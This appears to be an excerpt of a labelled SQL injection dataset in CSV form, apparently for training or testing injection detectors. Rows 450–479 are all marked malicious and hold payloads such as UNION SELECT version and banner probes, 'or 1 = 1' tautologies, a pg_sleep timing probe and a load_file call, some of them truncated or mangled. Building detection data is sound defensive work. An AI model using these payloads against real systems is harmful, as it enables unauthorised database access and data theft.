row_index,payload_norm,label,sqli_type_hint
450,"select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1,
451,admin'or 1 = 1 or '' = ',1,
452,"select * from users where id = '1' or !<1 union select 1,version ( ) -- 1'",1,
453,"and 1 = ( if ( ( load_file ( char ( 110,46,101,120,11 ...",1,
454,exec ( @s ),1,
455,"select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1,
456,"select * from users where id = 1 or \.< = 1 union select 1,@@VERSION -- 1",1,
457,select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1,
458,"select * from users where id = 1. union select version ( ) ,version ( ) -- 1",1,
459,x' AND email IS NULL; --,1,
460,"select * from users where id = '1' + @ @1 union select 1,version ( ) -- 1'",1,
461,"select * from users where id = '1' union select null,banner from v$version where rownum = 1 -- 1'",1,
462,"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1,
463,"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1,
464,update,1,
465,"select * from users where id = 1.<1# union select 1,version ( ) -- 1",1,
466,""" ) ) or pg_sleep ( __TIME__ ) --",1,
467,||'6,1,
468,"select * from users where id = 1. <@ union select 1,version ( ) -- 1",1,
469,or ( EXISTS ),1,
470,or 'text' = n'text',1,
471,"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1,
472,"select * from users where id = '1' union select $ _,@@VERSION -- 1'",1,
473,"select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1,
474,"select * from users where id = 1 <@1$ union select 1,version ( ) -- 1",1,
475,or 0 = 0 --,1,
476,"select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1,
477,"select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1,
478,"select * from users where id = 1 or 1#"", union select version ( ) ,version ( ) -- 1",1,
479,"select * from users where id = 1 or 1#""? union select 'a',version ( ) -- 1",1,
